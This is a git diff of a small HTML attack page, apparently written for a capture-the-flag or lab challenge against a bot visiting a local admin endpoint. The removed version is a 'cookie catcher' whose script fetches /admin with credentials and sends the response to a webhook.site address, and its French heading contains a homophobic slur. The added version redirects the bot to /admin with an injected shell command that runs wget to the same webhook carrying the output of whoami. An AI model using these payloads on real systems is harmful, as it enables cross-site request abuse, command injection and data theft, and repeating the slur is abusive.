@@ -1,23 +1,10 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>Cookie catcher</h1>
-    <p>Je te vole ton cookie et tu vas rien faire pd</p>
+    <h1>Commande exécutée !</h1>
     <script>
-    (async () => {
-    let cookies = await fetch("localhost:5000/admin", {
-        credentials: "include",
-    })
-        .then((r) => r.text())
-        .then((text) => {
-        fetch(
-            "https://webhook.site/4154552b-c675-427c-9072-5aeb3ef47f71?data=" +
-            encodeURIComponent(text)
-        );
-        });
-    })();
-
+      // On redirige le bot vers /admin avec une commande malveillante
+      window.location.href = "http://127.0.0.1:5000/admin?prompt=wget%20-O%20/dev/null%20https://webhook.site/4154552b-c675-427c-9072-5aeb3ef47f71?data=$(whoami)";
     </script>
-
   </body>
 </html>
